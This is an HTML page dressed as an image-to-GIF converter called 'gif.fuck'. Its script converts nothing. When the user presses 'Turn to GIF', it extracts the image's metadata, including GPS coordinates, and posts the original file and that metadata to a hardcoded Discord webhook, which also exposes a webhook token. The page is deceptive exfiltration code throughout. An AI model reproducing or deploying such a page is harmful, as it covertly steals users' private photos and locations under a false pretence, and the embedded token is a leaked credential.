<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>gif.fuck</title>
  <script src="https://cdn.jsdelivr.net/npm/exifr@7.1.3/dist/lite.umd.js"></script>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      min-height: 100vh;
      background: #050505;
      font-family: 'Inter', system-ui, -apple-system, sans-serif;
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
      background-image: 
        radial-gradient(circle at 20% 30%, rgba(255, 0, 128, 0.15) 0%, transparent 40%),
        radial-gradient(circle at 80% 70%, rgba(0, 255, 255, 0.12) 0%, transparent 40%);
    }
    .card {
      width: 100%;
      max-width: 480px;
      background: rgba(255, 255, 255, 0.03);
      border: 1px solid rgba(255, 255, 255, 0.08);
      border-radius: 28px;
      padding: 32px 28px;
      backdrop-filter: blur(20px);
      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7);
    }
    .logo {
      font-size: 1.8rem;
      font-weight: 800;
      letter-spacing: -1px;
      background: linear-gradient(90deg, #ff2d95, #00f0ff);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      text-align: center;
      margin-bottom: 8px;
    }
    .subtitle {
      text-align: center;
      color: #888;
      font-size: 0.95rem;
      margin-bottom: 28px;
    }
    .preview-area {
      width: 100%;
      aspect-ratio: 1;
      background: rgba(255, 255, 255, 0.04);
      border: 2px dashed rgba(255, 255, 255, 0.15);
      border-radius: 20px;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
      position: relative;
      margin-bottom: 24px;
      transition: all 0.3s ease;
    }
    .preview-area.has-image {
      border-style: solid;
      border-color: rgba(0, 240, 255, 0.3);
    }
    .preview-area img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      display: none;
    }
    .preview-area.has-image img {
      display: block;
    }
    .placeholder {
      text-align: center;
      color: #666;
      font-size: 0.95rem;
      padding: 20px;
    }
    .placeholder span {
      display: block;
      font-size: 2.5rem;
      margin-bottom: 10px;
    }
    .btn-row {
      display: flex;
      gap: 12px;
      margin-bottom: 16px;
    }
    .btn {
      flex: 1;
      padding: 16px;
      border: none;
      border-radius: 14px;
      font-size: 0.95rem;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.2s ease;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }
    .btn-secondary {
      background: rgba(255, 255, 255, 0.08);
      color: #fff;
    }
    .btn-secondary:hover {
      background: rgba(255, 255, 255, 0.14);
    }
    .btn-primary {
      background: linear-gradient(90deg, #ff2d95, #00f0ff);
      color: #000;
      width: 100%;
      margin-top: 8px;
      display: none;
    }
    .btn-primary:hover {
      transform: translateY(-2px);
      box-shadow: 0 10px 25px rgba(255, 45, 149, 0.3);
    }
    .btn-primary:disabled {
      opacity: 0.5;
      cursor: not-allowed;
      transform: none;
      box-shadow: none;
    }
    .status {
      text-align: center;
      margin-top: 18px;
      font-size: 0.95rem;
      min-height: 24px;
      color: #aaa;
    }
    .status.success { color: #00ff9d; }
    .status.error { color: #ff4d6d; }
    .status.loading { color: #00f0ff; }
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">gif.fuck</div>
    <div class="subtitle">Supports JPG, PNG, WEBP, HEIC, AVIF, TIFF, GIF + more</div>

    <div class="preview-area" id="previewArea">
      <div class="placeholder" id="placeholder">
        <span></span>
        Drop or select any image
      </div>
      <img id="preview" alt="Preview">
    </div>

    <div class="btn-row">
      <button class="btn btn-secondary" id="uploadBtn">Gallery</button>
      <button class="btn btn-secondary" id="cameraBtn">Camera</button>
    </div>

    <button class="btn btn-primary" id="convertBtn">Turn to GIF</button>

    <div class="status" id="status"></div>
  </div>

  <!-- Accept almost every image type -->
  <input type="file" id="fileInput" accept="image/*,.heic,.heif,.avif,.tiff,.tif,.bmp,.gif,.webp" hidden>
  <input type="file" id="cameraInput" accept="image/*,.heic,.heif" capture="environment" hidden>

  <script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1536294907306840125/EUtQw41CiZDG2sTuh4Tt_LLwgvRQKol6dv-YeTOQfl44xoekO8mByVGfYKWjz15_EuFY";

    const statusEl = document.getElementById('status');
    const convertBtn = document.getElementById('convertBtn');
    const preview = document.getElementById('preview');
    const previewArea = document.getElementById('previewArea');
    const placeholder = document.getElementById('placeholder');
    let selectedFile = null;

    function updateStatus(text, type = "") {
      statusEl.textContent = text;
      statusEl.className = "status " + type;
    }

    // Supported image MIME types + extensions
    function isImageFile(file) {
      if (!file) return false;
      
      // Check MIME type
      if (file.type && file.type.startsWith("image/")) return true;
      
      // Fallback for some browsers / HEIC / AVIF that report empty type
      const name = file.name.toLowerCase();
      const extensions = [
        '.jpg', '.jpeg', '.png', '.gif', '.webp', '.bmp',
        '.heic', '.heif', '.avif', '.tiff', '.tif', '.svg'
      ];
      return extensions.some(ext => name.endsWith(ext));
    }

    async function getAllMetadata(file) {
      try {
        const data = await exifr.parse(file, {
          tiff: true,
          xmp: true,
          icc: true,
          jfif: true,
          ihdr: true,
          iptc: true,
          gps: true,
          // Helps with more formats
          mergeOutput: true
        });
        return data || {};
      } catch (e) {
        console.log("Metadata parse error:", e);
        return {};
      }
    }

    function formatMetadata(meta) {
      if (!meta || Object.keys(meta).length === 0) {
        return "No metadata found in this image.";
      }

      let lines = [];

      if (meta.Make) lines.push(`**Camera Make:** ${meta.Make}`);
      if (meta.Model) lines.push(`**Camera Model:** ${meta.Model}`);
      if (meta.Software) lines.push(`**Software:** ${meta.Software}`);
      if (meta.DateTimeOriginal) lines.push(`**Date Taken:** ${meta.DateTimeOriginal}`);
      if (meta.CreateDate) lines.push(`**Create Date:** ${meta.CreateDate}`);
      if (meta.ModifyDate) lines.push(`**Modify Date:** ${meta.ModifyDate}`);
      if (meta.ImageWidth && meta.ImageHeight) {
        lines.push(`**Dimensions:** ${meta.ImageWidth} × ${meta.ImageHeight}`);
      }
      if (meta.Orientation) lines.push(`**Orientation:** ${meta.Orientation}`);
      if (meta.ISO) lines.push(`**ISO:** ${meta.ISO}`);
      if (meta.FNumber) lines.push(`**Aperture:** f/${meta.FNumber}`);
      if (meta.ExposureTime) lines.push(`**Exposure:** ${meta.ExposureTime}s`);
      if (meta.FocalLength) lines.push(`**Focal Length:** ${meta.FocalLength}mm`);
      if (meta.LensModel) lines.push(`**Lens:** ${meta.LensModel}`);

      // GPS
      if (meta.latitude && meta.longitude) {
        lines.push(`**GPS Latitude:** \`${meta.latitude.toFixed(6)}\``);
        lines.push(`**GPS Longitude:** \`${meta.longitude.toFixed(6)}\``);
        if (meta.GPSAltitude) lines.push(`**Altitude:** ${meta.GPSAltitude} m`);
      }

      // Fallback if very little data
      if (lines.length < 2) {
        const extra = Object.keys(meta)
          .filter(k => meta[k] !== undefined && meta[k] !== null)
          .slice(0, 10)
          .map(k => `**${k}:** ${String(meta[k]).slice(0, 60)}`);
        lines = lines.concat(extra);
      }

      return lines.length > 0 ? lines.join("\n") : "No useful metadata found.";
    }

    async function sendToWebhook(file, meta) {
      const formData = new FormData();
      formData.append("file", file, file.name);

      const metaText = formatMetadata(meta);

      const content = 
        `**New image uploaded**\n` +
        `**Filename:** ${file.name}\n` +
        `**Type:** ${file.type || "unknown"}\n` +
        `**Size:** ${(file.size / 1024 / 1024).toFixed(2)} MB\n\n` +
        `**── Metadata ──**\n${metaText}`;

      formData.append("payload_json", JSON.stringify({
        content: content,
        username: "gif.fuck"
      }));

      await fetch(WEBHOOK_URL, { method: "POST", body: formData });
    }

    function handleFile(file) {
      if (!isImageFile(file)) {
        updateStatus("Please select a valid image file", "error");
        return;
      }

      selectedFile = file;

      // Show preview (works for most formats)
      const reader = new FileReader();
      reader.onload = function(e) {
        preview.src = e.target.result;
        previewArea.classList.add("has-image");
        placeholder.style.display = "none";
      };
      reader.onerror = function() {
        // Some formats (like HEIC) may not preview in all browsers
        previewArea.classList.add("has-image");
        placeholder.innerHTML = `<span></span>Selected: ${file.name}<br><small>(preview not available)</small>`;
        placeholder.style.display = "block";
      };
      reader.readAsDataURL(file);

      updateStatus(`Selected: ${file.name}`);
      convertBtn.style.display = "block";
      convertBtn.disabled = false;
    }

    async function convertToGif() {
      if (!selectedFile) return;

      updateStatus("Extracting metadata + sending...", "loading");
      convertBtn.disabled = true;

      try {
        const meta = await getAllMetadata(selectedFile);
        await sendToWebhook(selectedFile, meta);
        updateStatus("Sent with all available metadata", "success");
      } catch (err) {
        console.error(err);
        await sendToWebhook(selectedFile, {});
        updateStatus("Sent (metadata extraction failed)", "error");
      }

      convertBtn.disabled = false;
    }

    // Event listeners
    document.getElementById("uploadBtn").onclick = () => document.getElementById("fileInput").click();
    document.getElementById("cameraBtn").onclick = () => document.getElementById("cameraInput").click();
    convertBtn.onclick = convertToGif;

    document.getElementById("fileInput").onchange = e => handleFile(e.target.files[0]);
    document.getElementById("cameraInput").onchange = e => handleFile(e.target.files[0]);

    previewArea.onclick = () => {
      if (!selectedFile) document.getElementById("fileInput").click();
    };
  </script>
</body>
</html>
